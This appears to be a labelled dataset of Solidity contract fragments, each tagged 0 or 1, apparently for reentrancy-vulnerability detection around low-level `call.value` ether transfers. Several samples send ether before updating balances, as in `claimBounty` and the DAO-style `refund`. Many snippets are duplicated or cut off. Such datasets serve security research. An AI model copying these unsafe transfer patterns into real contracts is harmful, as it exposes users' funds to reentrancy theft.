uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0) {
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(Team_Forwarder).call.value(_com)(bytes4(keccak256("deposit()")))) {
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
if (_p3d > 0) {
if (!address(Team_Forwarder).call.value(_p3d)(bytes4(keccak256("deposit()")))){
_res = _p3d.add(_res);
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = _p3d;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns) {
uint256 _com = _eth / 50;
uint256 _long = _eth / 50;
if(_long > 0)
swapDeposit.transfer(_long);
uint256 _p3d;
if (!address(Team_Forwarder).call.value(_com)(bytes4(keccak256("deposit()")))) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != "") {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
if(!address(Team_Forwarder).call.value(_p3d)(bytes4(keccak256("deposit()")))) {
uint256 __rID = rID_ + 1;
round_[__rID].pot = round_[__rID].pot.add(_p3d);
_p3d = 0;
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns) {
uint256 _com = _eth / 50;
uint256 _long = _eth / 50;
if(_long > 0)
swapDeposit.transfer(_long);
uint256 _p3d;
if (!address(Team_Forwarder).call.value(_com)(bytes4(keccak256("deposit()")))) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != "") {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
if(!address(Team_Forwarder).call.value(_p3d)(bytes4(keccak256("deposit()")))) {
uint256 __rID = rID_ + 1;
round_[__rID].pot = round_[__rID].pot.add(_p3d);
_p3d = 0;
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
0
---------------------------------
1331 3211.sol
function someFunction() public payable {
gasBefore_ = gasleft();
if (!address(Jekyll_Island_Inc).call.value(msg.value)(bytes4(keccak256("deposit()")))) {
depositSuccessful_ = false;
gasAfter_ = gasleft();
} else {
depositSuccessful_ = true;
successfulTransactions_++;
gasAfter_ = gasleft();
function someFunction2() public payable {
gasBefore_ = gasleft();
if (!address(Jekyll_Island_Inc).call.value(msg.value)(bytes4(keccak256("deposit2()")))) {
depositSuccessful_ = false;
gasAfter_ = gasleft();
} else {
depositSuccessful_ = true;
successfulTransactions_++;
gasAfter_ = gasleft();
function someFunction3() public payable {
gasBefore_ = gasleft();
if (!address(Jekyll_Island_Inc).call.value(msg.value)(bytes4(keccak256("deposit3()")))) {
depositSuccessful_ = false;
gasAfter_ = gasleft();
} else {
depositSuccessful_ = true;
successfulTransactions_++;
gasAfter_ = gasleft();
function someFunction4() public payable {
gasBefore_ = gasleft();
if (!address(Jekyll_Island_Inc).call.value(msg.value)(bytes4(keccak256("deposit4()")))) {
depositSuccessful_ = false;
gasAfter_ = gasleft();
} else {
depositSuccessful_ = true;
successfulTransactions_++;
gasAfter_ = gasleft();
1
---------------------------------
1332 10711.sol
function withdrawTo(address _to) public auth {
require(_to.call.value(address(this).balance)());
function unwrapAndSend(TokenInterface wethToken, address _to, uint wethAmt) internal {
wethToken.withdraw(wethAmt);
require(_to.call.value(wethAmt)());
function buyAllAmountPayEth(OtcInterface otc,TokenInterface buyToken,uint buyAmt,TokenInterface wethToken) public payable returns (uint wethAmt) {
wethToken.deposit.value(msg.value)();
if (wethToken.allowance(this, otc) < msg.value) {
wethToken.approve(otc, uint(-1));
wethAmt = otc.buyAllAmount(buyToken, buyAmt, wethToken, msg.value);
buyAmt = min(buyAmt, buyToken.balanceOf(this));
(uint feeAmt, uint buyAmtRemainder) = fees.takeFee(buyAmt, buyToken);
require(buyToken.transfer(owner, feeAmt));
require(buyToken.transfer(msg.sender, buyAmtRemainder));
unwrapAndSend(wethToken, msg.sender, sub(msg.value, wethAmt));
function buyAllAmountPayEth(OtcInterface otc,TokenInterface buyToken,uint buyAmt,TokenInterface wethToken) public payable returns (uint wethAmt) {
wethToken.deposit.value(msg.value)();
if (wethToken.allowance(this, otc) < msg.value) {
wethToken.approve(otc, uint(-1));
wethAmt = otc.buyAllAmount(buyToken, buyAmt, wethToken, msg.value);
buyAmt = min(buyAmt, buyToken.balanceOf(this));
(uint feeAmt, uint buyAmtRemainder) = fees.takeFee(buyAmt, buyToken);
require(buyToken.transfer(owner, feeAmt));
require(buyToken.transfer(msg.sender, buyAmtRemainder));
unwrapAndSend(wethToken, msg.sender, sub(msg.value, wethAmt));
0
---------------------------------
1333 10970.sol
function execute(address _to, uint256 _value, bytes _data) mostOwner(keccak256(msg.data)) external returns (bool){
require(_to != address(0));
Withdraw(_to, _value, msg.sender);
return _to.call.value(_value)(_data);
0
---------------------------------
1334 12114.sol
function withdrawAndSend(TokenInterface wethToken, uint wethAmt) internal {
wethToken.withdraw(wethAmt);
require(msg.sender.call.value(wethAmt)());
function sellAllAmountBuyEth(OtcInterface otc, TokenInterface payToken, uint payAmt, TokenInterface wethToken, uint minBuyAmt) public returns (uint) {
require(payToken.transferFrom(msg.sender, this, payAmt));
if (payToken.allowance(this, otc) < payAmt) {
payToken.approve(otc, uint(-1));
uint wethAmt = otc.sellAllAmount(payToken, payAmt, wethToken, minBuyAmt);
(uint feeAmt, uint wethAmtRemainder) = takeFee(wethAmt);
require(wethToken.transfer(owner, feeAmt));
withdrawAndSend(wethToken, wethAmtRemainder);
return wethAmtRemainder;
function buyAllAmountBuyEth(OtcInterface otc, TokenInterface wethToken, uint wethAmt, TokenInterface payToken, uint maxPayAmt) public returns (uint payAmt) {
uint payAmtNow = otc.getPayAmount(payToken, wethToken, wethAmt);
require(payAmtNow <= maxPayAmt);
require(payToken.transferFrom(msg.sender, this, payAmtNow));
if (payToken.allowance(this, otc) < payAmtNow) {
payToken.approve(otc, uint(-1));
payAmt = otc.buyAllAmount(wethToken, wethAmt, payToken, payAmtNow);
(uint feeAmt, uint wethAmtRemainder) = takeFee(wethAmt);
require(wethToken.transfer(owner, feeAmt));
withdrawAndSend(wethToken, wethAmtRemainder);
function() public payable {}
0
---------------------------------
1335 14995.sol
function fund() public payable {
if (dateSaleStarted==0 || now < dateSaleStarted)
return _errorBuyingTokens("CrowdSale has not yet started.");
if (now > dateSaleEnded)
return _errorBuyingTokens("CrowdSale has ended.");
if (totalRaised >= hardCap)
return _errorBuyingTokens("HardCap has been reached.");
if (msg.value % 1000000000 != 0)
return _errorBuyingTokens("Must send an even amount of GWei.");
if (!wasSaleStarted) {
wasSaleStarted = true;
emit SaleStarted(now);
uint _amtToFund = (totalRaised + msg.value) > hardCap ? hardCap - totalRaised : msg.value;
uint _numTokens = getTokensFromEth(_amtToFund);
token.mint(msg.sender, _numTokens);
totalRaised += _amtToFund;
emit BuyTokensSuccess(now, msg.sender, _amtToFund, _numTokens);
if (totalRaised < softCap) {
amtFunded[msg.sender] += _amtToFund;
uint _refund = msg.value > _amtToFund ? msg.value - _amtToFund : 0;
if (_refund > 0){
require(msg.sender.call.value(_refund)());
emit UserRefunded(now, msg.sender, _refund);
function endSale() public {
require(wasSaleStarted && !wasSaleEnded);
require(totalRaised >= hardCap || now > dateSaleEnded);
wasSaleEnded = true;
wasSoftCapMet = totalRaised >= softCap;
if (!wasSoftCapMet) {
token.mint(wallet, 1e30);
emit SaleFailed(now);
return;
token.freeze(false);
uint _lockerAmt = token.totalSupply() / 4;
token.mint(locker, _lockerAmt);
locker.startVesting(_lockerAmt, 600);
uint _capitalAmt = (totalRaised * capitalPctBips) / 10000;
if (address(this).balance < _capitalAmt) _capitalAmt = address(this).balance;
treasury.addCapital.value(_capitalAmt)();
if (wallet.call.value(address(this).balance)()) {}
emit SaleSuccessful(now);
function refund() public {
require(wasSaleEnded && !wasSoftCapMet);
require(amtFunded[msg.sender] > 0);
uint _amt = amtFunded[msg.sender];
amtFunded[msg.sender] = 0;
require(msg.sender.call.value(_amt)());
emit UserRefunded(now, msg.sender, _amt);
function fundCapital() public payable {
if (!wasSaleEnded)
return _errorBuyingTokens("Sale has not ended.");
if (!wasSoftCapMet)
return _errorBuyingTokens("SoftCap was not met.");
uint _amtNeeded = capitalFundable();
uint _amount = msg.value > _amtNeeded ? _amtNeeded : msg.value;
if (_amount == 0) {
return _errorBuyingTokens("No capital is needed.");
totalRaised += _amount;
token.mint(msg.sender, _amount);
treasury.addCapital.value(_amount)();
emit BuyTokensSuccess(now, msg.sender, _amount, _amount);
uint _refund = msg.value > _amount ? msg.value - _amount : 0;
if (_refund > 0) {
require(msg.sender.call.value(_refund)());
emit UserRefunded(now, msg.sender, _refund);
function _errorBuyingTokens(string _reason) private {
require(msg.sender.call.value(msg.value)());
emit BuyTokensFailure(now, msg.sender, _reason);
function collectOwedDividends() public returns (uint _amount) {
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
function collect() public {
require(msg.sender == owner);
token.collectOwedDividends();
uint _amount = address(this).balance;
if (_amount > 0) require(owner.call.value(_amount)());
emit Collected(now, owner, _amount);
1
---------------------------------
1336 18425.sol
function payout() public {
uint balance = address(this).balance;
require(balance > 1);
uint investment = balance / 2;
balance =- investment;
flmContract.call.value(investment).gas(1000000)();
while (balance > 0) {
uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
if(payoutToSend > 0){
participants[payoutOrder].payout -= payoutToSend;
balance -= payoutToSend;
if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
if(balance > 0){
payoutOrder += 1;
function payout() public {
uint balance = address(this).balance;
require(balance > 1);
uint investment = balance / 2;
balance =- investment;
flmContract.call.value(investment).gas(1000000)();
while (balance > 0) {
uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
if(payoutToSend > 0){
participants[payoutOrder].payout -= payoutToSend;
balance -= payoutToSend;
if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
if(balance > 0){
payoutOrder += 1;
0
---------------------------------
1337 21604.sol
function buyToken() public payable {
address currentOwner;
uint256 currentPrice;
uint256 paidTooMuch;
uint256 payment;
if (tokenPrice < tokenPrice2) {
currentOwner = tokenOwner;
currentPrice = tokenPrice;
require(tokenOwner2 != msg.sender);
} else {
currentOwner = tokenOwner2;
currentPrice = tokenPrice2;
require(tokenOwner != msg.sender);
require(msg.value >= currentPrice);
paidTooMuch = msg.value.sub(currentPrice);
payment = currentPrice.div(2);
if (tokenPrice < tokenPrice2) {
tokenPrice = currentPrice.mul(110).div(50);
tokenOwner = msg.sender;
} else {
tokenPrice2 = currentPrice.mul(110).div(50);
tokenOwner2 = msg.sender;
lastBuyBlock = block.number;
flips++;
Transfer(currentOwner, msg.sender, currentPrice);
if (currentOwner != address(0)) {
payoutRound = getRoundId()-3;
currentOwner.call.value(payment).gas(24000)();
if (paidTooMuch > 0)
msg.sender.transfer(paidTooMuch);
function finishRound() public {
require(tokenPrice > tokenStartPrice);
require(lastBuyBlock + newRoundDelay < block.number);
lastBuyBlock = block.number;
address owner = tokenOwner;
uint price = tokenPrice;
if (tokenPrice2>tokenPrice) {
owner = tokenOwner2;
price = tokenPrice2;
uint lastPaidPrice = price.mul(50).div(110);
uint win = this.balance - lastPaidPrice;
if (highestPrice < lastPaidPrice) {
richestPlayer = owner;
highestPrice = lastPaidPrice;
richestRoundId = getRoundId()-1;
tokenPrice = tokenStartPrice;
tokenPrice2 = tokenStartPrice2;
tokenOwner = address(0);
tokenOwner2 = address(0);
payoutRound = getRoundId()-1;
flips = 0;
round++;
NewRound(lastPaidPrice, win / 2, owner);
contractOwner.transfer((this.balance - (lastPaidPrice + win / 2) - win / 10) * 19 / 20);
owner.call.value(lastPaidPrice + win / 2).gas(24000)();
if (richestPlayer!=address(0)) {
payoutRound = richestRoundId;
RichestBonus(win / 10, richestPlayer);
richestPlayer.call.value(win / 10).gas(24000)();
function finishRound() public {
require(tokenPrice > tokenStartPrice);
require(lastBuyBlock + newRoundDelay < block.number);
lastBuyBlock = block.number;
address owner = tokenOwner;
uint price = tokenPrice;
if (tokenPrice2>tokenPrice) {
owner = tokenOwner2;
price = tokenPrice2;
uint lastPaidPrice = price.mul(50).div(110);
uint win = this.balance - lastPaidPrice;
if (highestPrice < lastPaidPrice) {
richestPlayer = owner;
highestPrice = lastPaidPrice;
richestRoundId = getRoundId()-1;
tokenPrice = tokenStartPrice;
tokenPrice2 = tokenStartPrice2;
tokenOwner = address(0);
tokenOwner2 = address(0);
payoutRound = getRoundId()-1;
flips = 0;
round++;
NewRound(lastPaidPrice, win / 2, owner);
contractOwner.transfer((this.balance - (lastPaidPrice + win / 2) - win / 10) * 19 / 20);
owner.call.value(lastPaidPrice + win / 2).gas(24000)();
if (richestPlayer!=address(0)) {
payoutRound = richestRoundId;
RichestBonus(win / 10, richestPlayer);
richestPlayer.call.value(win / 10).gas(24000)();
0
---------------------------------
1338 35978.sol
function init() returns (uint) {
if (!main.NoxonInit.value(12)()) throw;
if (!main.call.value(24)()) revert();
assert(main.balanceOf(address(this)) == 2);
if (main.call.value(23)()) revert();
assert(main.balanceOf(address(this)) == 2);
function init() returns (uint) {
if (!main.NoxonInit.value(12)()) throw;
if (!main.call.value(24)()) revert();
assert(main.balanceOf(address(this)) == 2);
if (main.call.value(23)()) revert();
assert(main.balanceOf(address(this)) == 2);
function test1() returns (uint) {
if (!main.call.value(26)()) revert();
assert(main.balanceOf(address(this)) == 3);
assert(main.emissionPrice() == 24);
return main.balance;
function test2() returns (uint){
if (!main.call.value(40)()) revert();
assert(main.balanceOf(address(this)) == 4);
0
---------------------------------
1339 36968.sol
function claim_bounty(){
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
1340 37498.sol
function execute(address _to, uint _value, bytes _data) external onlyowner payable returns (bool){
return _to.call.value(_value)(_data);
0
---------------------------------
1341 37645.sol
function endSale() {
if (saleHasEnded) throw;
if (!minCapReached) throw;
if (msg.sender != executor) throw;
uint256 additionalSFT = (totalSupply.mul(DEV_PORTION)).div(100 - DEV_PORTION);
uint256 totalSupplySafe = totalSupply.add(additionalSFT);
uint256 devShare = additionalSFT;
totalSupply = totalSupplySafe;
balances[devSFTDestination] = devShare;
saleHasEnded = true;
if (this.balance > 0) {
if (!devETHDestination.call.value(this.balance)()) throw;
function withdrawFunds() {
if (0 == this.balance) throw;
if (!minCapReached) throw;
if (!devETHDestination.call.value(this.balance)()) throw;
0
---------------------------------
1342 37676.sol
function send(address _to, uint _value, bytes _data) only_owner {
if (!_to.call.value(_value)(_data)) throw;
Sent(_to, _value, _data);
0
---------------------------------
1343 37707.sol
function claimBounty() preventTheft {
uint balance = bountyAmount[msg.sender];
if (msg.sender.call.value(balance)()) {
totalBountyAmount -= balance;
bountyAmount[msg.sender] = 0;
1
---------------------------------
1344 38250.sol
function endSale() {
if (saleHasEnded) throw;
if (!minCapReached) throw;
if (msg.sender != executor) throw;
saleHasEnded = true;
uint256 additionalSENS = (totalSupply.mul(DEV_PORTION)).div(100 - DEV_PORTION);
uint256 totalSupplySafe = totalSupply.add(additionalSENS);
uint256 devShare = additionalSENS;
totalSupply = totalSupplySafe;
balances[devSENSDestination] = devShare;
if (this.balance > 0) {
if (!devETHDestination.call.value(this.balance)()) throw;
function withdrawFunds() {
if (0 == this.balance) throw;
if (!devETHDestination.call.value(this.balance)()) throw;
0
---------------------------------
1345 38873.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner returns (bytes32 _r) {
if (underLimit(_value)) {
SingleTransact(msg.sender, _value, _to, _data);
if (!_to.call.value(_value)(_data)) {
throw;
return 0;
_r = keccak256(msg.data, block.number);
if (!confirm(_r) && txs[_r].to == 0) {
txs[_r].to = _to;
txs[_r].value = _value;
txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (txs[_h].to != 0) {
if (!txs[_h].to.call.value(txs[_h].value)(txs[_h].data)) {
throw;
MultiTransact(msg.sender, _h, txs[_h].value, txs[_h].to, txs[_h].data);
delete txs[_h];
return true;
0
---------------------------------
1346 39190.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {
throw;
return true;
return false;
uint constant DEFAULT_SEND_GAS = 100000;
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
0
---------------------------------
1347 40299.sol
function redeem(uint tokens) {
if (!feeAccount.call.value(safeMul(tokens,fee)/(1 ether))()) throw;
if (!resolved) {
yesToken.destroy(msg.sender, tokens);
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, tokens);
} else if (resolved) {
if (outcome==0) {
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, 0, tokens);
} else if (outcome==1) {
yesToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, 0);
function redeem(uint tokens) {
if (!feeAccount.call.value(safeMul(tokens,fee)/(1 ether))()) throw;
if (!resolved) {
yesToken.destroy(msg.sender, tokens);
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, tokens);
} else if (resolved) {
if (outcome==0) {
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, 0, tokens);
} else if (outcome==1) {
yesToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, 0);
function redeem(uint tokens) {
if (!feeAccount.call.value(safeMul(tokens,fee)/(1 ether))()) throw;
if (!resolved) {
yesToken.destroy(msg.sender, tokens);
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, tokens);
} else if (resolved) {
if (outcome==0) {
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, 0, tokens);
} else if (outcome==1) {
yesToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, 0);
function redeem(uint tokens) {
if (!feeAccount.call.value(safeMul(tokens,fee)/(1 ether))()) throw;
if (!resolved) {
yesToken.destroy(msg.sender, tokens);
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, tokens);
} else if (resolved) {
if (outcome==0) {
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, 0, tokens);
} else if (outcome==1) {
yesToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, 0);
0
---------------------------------
1348 40357.sol
function split(address ethDestination, address etcDestination) {
if (amIOnTheFork.forked()) {
ethDestination.call.value(msg.value)();
} else {
uint fee = msg.value / 100;
feeRecipient.send(fee);
etcDestination.call.value(msg.value - fee)();
function split(address ethDestination, address etcDestination) {
if (amIOnTheFork.forked()) {
ethDestination.call.value(msg.value)();
} else {
uint fee = msg.value / 100;
feeRecipient.send(fee);
etcDestination.call.value(msg.value - fee)();
1
---------------------------------
1349 40500.sol
function payOut(address _recipient, uint _amount) returns (bool) {
if (msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))
throw;
if (_recipient.call.value(_amount)()) {
PayOut(_recipient, _amount);
return true;
} else {
return false;
contract TokenInterface {
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
uint256 public totalSupply;
function createTokenProxy(address _tokenHolder) returns (bool success) {
if (now < closingTime && msg.value > 0
&& (privateCreation == 0 || privateCreation == msg.sender)) {
uint token = (msg.value * 20) / divisor();
extraBalance.call.value(msg.value - token)();
balances[_tokenHolder] += token;
totalSupply += token;
weiGiven[_tokenHolder] += msg.value;
CreatedToken(_tokenHolder, token);
if (totalSupply >= minTokensToCreate && !isFueled) {
isFueled = true;
FuelingToDate(totalSupply);
return true;
throw;
function refund() noEther {
if (now > closingTime && !isFueled) {
if (extraBalance.balance >= extraBalance.accumulatedInput())
extraBalance.payOut(address(this), extraBalance.accumulatedInput());
if (msg.sender.call.value(weiGiven[msg.sender])()) {
Refund(msg.sender, weiGiven[msg.sender]);
totalSupply -= balances[msg.sender];
balances[msg.sender] = 0;
weiGiven[msg.sender] = 0;
function executeProposal(uint _proposalID, bytes _transactionData) noEther returns (bool _success) {
Proposal p = proposals[_proposalID];
uint waitPeriod = p.newCurator ? splitExecutionPeriod : executeProposalPeriod;
if (p.open && now > p.votingDeadline + waitPeriod) {
closeProposal(_proposalID);
return;
if (now < p.votingDeadline || !p.open || p.proposalHash != sha3(p.recipient, p.amount, _transactionData)) {
throw;
if (!isRecipientAllowed(p.recipient)) {
closeProposal(_proposalID);
p.creator.send(p.proposalDeposit);
return;
bool proposalCheck = true;
if (p.amount > actualBalance())
proposalCheck = false;
uint quorum = p.yea + p.nay;
if (_transactionData.length >= 4 && _transactionData[0] == 0x68
&& _transactionData[1] == 0x37 && _transactionData[2] == 0xff
&& _transactionData[3] == 0x1e
&& quorum < minQuorum(actualBalance() + rewardToken[address(this)])) {
proposalCheck = false;
if (quorum >= minQuorum(p.amount)) {
if (!p.creator.send(p.proposalDeposit))
throw;
lastTimeMinQuorumMet = now;
if (quorum > totalSupply / 5)
minQuorumDivisor = 5;
if (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {
if (!p.recipient.call.value(p.amount)(_transactionData))
throw;
p.proposalPassed = true;
_success = true;
if (p.recipient != address(this) && p.recipient != address(rewardAccount)
&& p.recipient != address(DAOrewardAccount)
&& p.recipient != address(extraBalance)
&& p.recipient != address(curator)) {
rewardToken[address(this)] += p.amount;
totalRewardToken += p.amount;
closeProposal(_proposalID);
ProposalTallied(_proposalID, _success, quorum);
function newContract(address _newContract){
if (msg.sender != address(this) || !allowedRecipients[_newContract]) return;
